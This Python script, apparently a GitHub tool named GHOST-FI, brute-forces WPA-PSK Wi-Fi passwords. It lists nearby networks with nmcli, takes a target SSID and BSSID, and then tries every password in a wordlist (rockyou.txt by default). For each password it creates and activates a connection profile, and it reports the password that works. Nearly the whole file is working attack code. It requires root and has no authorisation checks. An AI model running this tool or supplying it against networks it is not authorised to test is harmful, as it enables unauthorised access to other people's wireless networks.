#!/usr/bin/env python3
import subprocess
import time
import os 
import sys
from colorama import *
from pyfiglet import Figlet

#Checks if a Wi-Fi network with the given SSID  Entered SSID and BSSID  available using nmcli.

def network_exist(ssid, bssid):
	ssid = ssid.strip()
	bssid = bssid.strip().lower()

	if not ssid or not bssid:
		print( Fore.RED+"=>  SSID and BSSID cannot be empty."+Style.RESET_ALL)
		return False

	try:
		result = subprocess.run(
			["nmcli", "-t", "--escape", "no", "-f", "BSSID,SSID", "device", "wifi", "list"],
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			text=True,
			check=True
		)

		output = result.stdout.strip()
		if not output:
			print( Fore.YELLOW+"=> No Wi-Fi networks found by nmcli.")
			return False

		print("DEBUG: Raw nmcli output:")
		print(output)

		lines = output.split('\n')

		for line in lines:
			parts = line.strip().split(':')
			if len(parts) < 7:
				print(f"DEBUG: Skipping malformed line: {line}")
				continue

			# Extract BSSID from first 6 fields
			entry_bssid = ':'.join(parts[:6]).lower()
			entry_ssid = ':'.join(parts[6:]).strip()

			print(f"DEBUG: Checking SSID='{entry_ssid}' with BSSID='{entry_bssid}'")

			if entry_ssid.lower() == ssid.lower() and entry_bssid == bssid:
				print("DEBUG: Network found!")
				return True

		print(Fore.BLUE+"DEBUG: Network not found.")
		return False

	except subprocess.CalledProcessError as e:
		print(Fore.RED + f"=> Error fetching Wi-Fi list: {e.stderr.strip()}")
		return False
	except FileNotFoundError:
		print(  Fore.YELLOW+"=> Error: nmcli command not found. Please ensure NetworkManager is installed.")
		return False
	except Exception as e:
		print( Fore.RED + f"=>  Unexpected error: {e}")
		return False

#-----------------------------------------------------------------------------------------------------------------------------#

#Lists available Wi-Fi networks with detailed info using 'nmcli'.

def list_available_networks():

	"""Lists available Wi-Fi networks using 'nmcli device wifi list'.  """
	print("\n---------- Available Wi-Fi Networks ----------")
	try:
		result = subprocess.run(
			["nmcli", "-fields", "BSSID,SSID,MODE,CHAN,RATE,SIGNAL,BARS,SECURITY", "device", "wifi", "list", "--rescan", "yes"],
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			text=True,
			check=True
		)
		print(result.stdout)
		print("----------------------------------------------\n")
	except subprocess.CalledProcessError as e:
		print( Fore.RED+f"=> Error listing Wi-Fi networks: {e.stderr}")
		print( Fore.LIGHTYELLOW_EX+"	Please ensure NetworkManager is running and you have appropriate permissions.")
	except FileNotFoundError:
		print( Fore.LIGHTYELLOW_EX+ "=>  Error: 'nmcli' command not found. Please ensure NetworkManager is installed.")
	except Exception as e:
		print( f"=>  An unexpected error occurred while listing networks: {e}")

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------#

#Brute force the wifi with the Pass List provided (Uses rockyou.txt as default)

def connect_with_profile(ssid, bssid,path="/usr/share/wordlists/rockyou.txt"): 

	profile_name = f"wifi_{ssid}_{bssid.replace(':', '')}"  
	try:
		with open(path, 'rb') as file:
			content = file.read().decode('utf-8', errors='ignore')
			passwords = [line.strip() for line in content.splitlines() if line.strip()]
	except FileNotFoundError:
		print( Fore.YELLOW+f"=>  Error: Password file not found at '{path}'. Please ensure the path is correct.")
		return
	except Exception as e:
		print( Fore.RED + f"=>  Error reading password file: {e}")
		return

	if not passwords:
		print(Fore.YELLOW+f" > Warning: No passwords found in the file '{path}'.")
		return
	print("\n-------------------------------------------------------------------------------------------------------")
	print( f"Attempting to connect to Wi-Fi network: '{ssid}'")
	if bssid:
		print( f"Targeting BSSID: {bssid}")
	print( f"Total passwords to try: {len(passwords)}")

	for i, password in enumerate(passwords):
		print(Fore.BLUE+f"\n>  ----------------- Trying password {i+1}/{len(passwords)} -------------------\n"+Style.RESET_ALL)

		# Delete old profile (ignore errors if not found)
		subprocess.run(
			["nmcli", "connection", "delete", profile_name],
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL
		)
		time.sleep(0.5)

		# Build the nmcli command dynamically
		add_profile_cmd = [
			"nmcli", "connection", "add",
			"type", "wifi",
			"ifname", "*",
			"con-name", profile_name,
			"ssid", ssid,
			"--",
			"wifi-sec.key-mgmt", "wpa-psk",
			"wifi-sec.psk", password
		]

		# Add BSSID if provided
		if bssid:
			add_profile_cmd.extend(["wifi.bssid", bssid]) 

		try:
			# Add the connection
			add_result = subprocess.run(add_profile_cmd, check=True,
										stdout=subprocess.PIPE, stderr=subprocess.PIPE,
										text=True)
			print(f"DEBUG: Add profile stdout: {add_result.stdout.strip()}")
			print(f"DEBUG: Add profile stderr: {add_result.stderr.strip()}")

			time.sleep(1)

			# Attempt to bring up the connection
			print(f"Activating connection '{profile_name}'...")
			up_result = subprocess.run(
				["nmcli", "connection", "up", profile_name],
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				text=True,
				check=True,
				timeout=20
			)

			print(Fore.GREEN+f"\n=>  Success! Connected to '{ssid}' with password : '{password}' "+Style.RESET_ALL)
			return

		except subprocess.CalledProcessError as e:
			print(Fore.LIGHTYELLOW_EX+ f"=>  Failed to connect with current password: '{password}'"+Style.RESET_ALL)
			if "Authentication failed" in e.stderr or "Secret was not provided" in e.stderr:
				print("	Reason: Authentication failed (likely incorrect password).")
			elif "device is not ready" in e.stderr or "network is out of range" in e.stderr:
				print("	Reason: Network not found or device not ready.")
			else:
				print(f"	Reason: {e.stderr.strip() if e.stderr else 'Unknown nmcli error'}")
			continue

		except subprocess.TimeoutExpired:
			print( Fore.LIGHTYELLOW_EX+ f"=>  Connection attempt timed out after 20 seconds.")
			continue

		except Exception as e:
			print(Fore.RED + f"=>  An unexpected error occurred: {e}"+Style.RESET_ALL)
			continue

	print( Fore.YELLOW+f"\n=>  Failed to connect to '{ssid}' with any provided password."+Style.RESET_ALL)

#------------------------------------------------------------------------------------------------------------#

#Main Function

if __name__ == "__main__":

	if os.geteuid() != 0:
		print( Fore.RED+"\n=> This script must be run as root. Please use 'sudo'."+Style.RESET_ALL)
		sys.exit(1)

	figlet = Figlet(font='slant')
	ascii_art = figlet.renderText('\n      GHOST-FI       ')
	print(Fore.LIGHTRED_EX + ascii_art + Style.RESET_ALL)
	print(Fore.LIGHTCYAN_EX +"\n"*5+ " " *40+  "Created by: MohammedAbdulAhadSaud\n")
	print(Fore.LIGHTYELLOW_EX + " " * 40 + "GitHub: https://github.com/MohammedAbdulAhadSaud/Ghost-Fi\n" + Style.RESET_ALL)
	


	list_available_networks()
	ssid = input(Fore.LIGHTWHITE_EX +" > Enter SSID (required):  ").strip()
	bssid= input(Fore.LIGHTWHITE_EX +" > Enter BSSID (requried):  ").strip()
	path_input = input(Fore.LIGHTWHITE_EX +" > Enter path to password file (Press Enter to use default rockyou.txt): ")
	print(Style.RESET_ALL+"\n-------------------------------------------------------------------------------------------------------")
	path= path_input if path_input else "/usr/share/wordlists/rockyou.txt"


	if not ssid or not bssid:
		print( Fore.RED+"=>  SSID and BSSID are required to proceed.")

	elif not network_exist(ssid, bssid):
		print( Fore.RED+f"=>  The network '{ssid}' with BSSID '{bssid}' is not currently visible.")

	else:
		print( Fore.BLUE+f"=>  Network '{ssid}' with BSSID '{bssid}' found — proceeding to connect..."+Style.RESET_ALL)
		print("\n-------------------------------------------------------------------------------------------------------")
		connect_with_profile(ssid, bssid,path)
